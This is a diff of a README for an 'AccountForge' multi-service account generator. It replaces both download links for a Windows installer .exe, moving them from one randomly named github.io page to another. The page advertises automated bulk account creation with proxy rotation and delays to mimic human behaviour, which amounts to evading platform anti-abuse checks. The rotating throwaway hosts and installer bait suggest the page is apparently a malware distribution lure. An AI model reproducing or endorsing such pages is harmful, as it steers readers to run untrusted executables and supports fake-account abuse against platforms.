@@ -2,7 +2,7 @@
 
 This is the ultimate multi-service generator for 2026, designed for developers, testers, and researchers who need to generate test data and temporary accounts across various online platforms. The AccountForge tool automates the creation of accounts, simulating the process from initial email verification to profile setup, making it an essential component of your digital testing toolkit.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07-exe-blue?style=for-the-badge&logo=windows&logoColor=white)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07-exe-blue?style=for-the-badge&logo=windows&logoColor=white)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -47,4 +47,4 @@ A: The tool includes built-in proxy rotation and configurable delays to mimic hu
 
 To get started with the AccountForge Multi-Service Generator, download the latest stable release directly from our official source. Ensure you always use the most recent version for the best compatibility and security.
 
-[Download the latest version from the official website](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from the official website](https://capitals-707-bringing.github.io/download-page/)
